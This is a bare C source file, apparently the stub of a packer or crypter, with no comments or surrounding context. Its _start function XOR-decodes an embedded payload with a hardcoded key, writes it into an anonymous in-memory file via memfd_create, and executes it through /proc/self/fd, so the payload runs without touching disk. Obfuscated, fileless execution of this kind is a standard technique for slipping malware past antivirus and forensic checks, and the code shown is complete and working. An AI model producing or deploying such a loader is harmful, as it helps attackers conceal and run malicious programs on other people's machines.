#define _GNU_SOURCE
#include <stdint.h>
#include <sys/mman.h>
#include <sys/syscall.h>
#include <unistd.h>

extern long __syscall(long, long, long, long, long, long, long);

extern uint8_t* payload;
extern long payload_size;

__attribute__((always_inline)) static inline char* __strncpy(char* dst, const char* src, size_t n)
{
    size_t i = 0;
    for (; i < n && src[i]; i++)
        dst[i] = src[i];
    for (; i < n; i++)
        dst[i] = '\0';

    return dst;
}

__attribute__((always_inline)) static inline size_t __strlen(const char* s)
{
    size_t ret = 0;
    while (*s++)
        ret++;
    return ret;
}

__attribute__((always_inline)) static inline void __utoa(unsigned int n, char s[])
{
    int i, j;
    char c;

    i = 0;
    do {
        s[i++] = n % 10 + '0';
    } while ((n /= 10) > 0);
    s[i] = '\0';

    for (i = 0, j = __strlen(s) - 1; i < j; i++, j--) {
        c = s[i];
        s[i] = s[j];
        s[j] = c;
    }
}

__attribute__((always_inline)) static inline int __readlink(const char* path, char* buf, size_t bufsiz)
{
    return __syscall(SYS_readlink, (long)path, (long)buf, bufsiz, 0, 0, 0);
}

__attribute__((always_inline)) static inline int __memfd_create(const char* name, unsigned int flags)
{
    return __syscall(SYS_memfd_create, (long)name, flags, 0, 0, 0, 0);
}

__attribute__((always_inline)) static inline int __ftruncate(int fd, size_t size)
{
    return __syscall(SYS_ftruncate, fd, size, 0, 0, 0, 0);
}

__attribute__((always_inline)) static inline int __exit(int status)
{
    return __syscall(SYS_exit, status, 0, 0, 0, 0, 0);
}

__attribute__((always_inline)) static inline int __write(int fd, const uint8_t* buf, size_t size)
{
    return __syscall(SYS_write, fd, (long)buf, size, 0, 0, 0);
}

__attribute__((always_inline)) static inline int __execve(const char* pathname, char* const argv[], char* const envp[])
{
    return __syscall(SYS_execve, (long)pathname, (long)argv, (long)envp, 0, 0, 0);
}

void _start()
{
    int i, fd;
    size_t key_len;
    char payload_path[4096] = {};
    char my_path[4096] = {};
    char* argv[] = { my_path, NULL };
    char* envp[] = { NULL };

    if (__readlink("/proc/self/exe", my_path, sizeof(my_path)) == -1)
        __exit(1);

    fd = __memfd_create("payload", MFD_CLOEXEC);
    if (fd == -1 || fd > 10)
        __exit(2);

    if (__ftruncate(fd, payload_size) != 0)
        __exit(3);

    for (i = 0; i < payload_size; i++)
        payload[i] ^= "w35tg@t3"[i % 8];

    while (payload_size > 0) {
        ssize_t written = __write(fd, payload, payload_size);
        if (written < 0)
            __exit(4);

        payload += written;
        payload_size -= written;
    }

    __strncpy(payload_path, "/proc/self/fd/", sizeof(payload_path));
    __utoa(fd, payload_path + __strlen(payload_path));

    __execve(payload_path, argv, envp);
    __exit(0);
}
